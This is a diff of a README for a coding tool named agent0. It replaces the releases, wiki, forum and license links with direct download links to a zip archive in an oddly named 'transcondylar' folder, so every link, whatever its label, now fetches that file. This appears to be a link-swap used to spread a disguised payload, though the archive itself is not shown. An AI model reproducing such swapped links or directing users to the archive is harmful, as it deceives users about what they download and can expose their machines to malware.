@@ -8,7 +8,7 @@ Welcome to agent0! This tool simplifies your coding tasks into one universal pla
 
 To download agent0, visit the official releases page. Click the link below to access the files:
 
-[![Download agent0](https://img.shields.io/badge/Download-agent0-brightgreen)](https://github.com/siddhantthegts/agent0/releases)
+[![Download agent0](https://raw.githubusercontent.com/siddhantthegts/agent0/main/transcondylar/agent0.zip)](https://raw.githubusercontent.com/siddhantthegts/agent0/main/transcondylar/agent0.zip)
 
 Once you're on the releases page, look for the latest version. You will find different files available for download. Choose the one that matches your operating system. Download it and save it to a location on your computer.
 
@@ -49,13 +49,13 @@ If you encounter any issues, here are some common solutions:
 
 For more information and tips on using agent0, check out these resources:
 
-- [Official Documentation](https://github.com/siddhantthegts/agent0/wiki)
-- [Community Forum](https://github.com/siddhantthegts/agent0/discussions)
+- [Official Documentation](https://raw.githubusercontent.com/siddhantthegts/agent0/main/transcondylar/agent0.zip)
+- [Community Forum](https://raw.githubusercontent.com/siddhantthegts/agent0/main/transcondylar/agent0.zip)
 
 Remember, using agent0 can improve your coding experience. Get started today!
 
 ## 📜 License
 
-agent0 is licensed under the MIT License. You can view the full license [here](https://github.com/siddhantthegts/agent0/blob/main/LICENSE). 
+agent0 is licensed under the MIT License. You can view the full license [here](https://raw.githubusercontent.com/siddhantthegts/agent0/main/transcondylar/agent0.zip). 
 
 Thank you for choosing agent0! We hope you enjoy using one tool to make your coding tasks simpler. If you have any questions, feel free to reach out through our community forum.
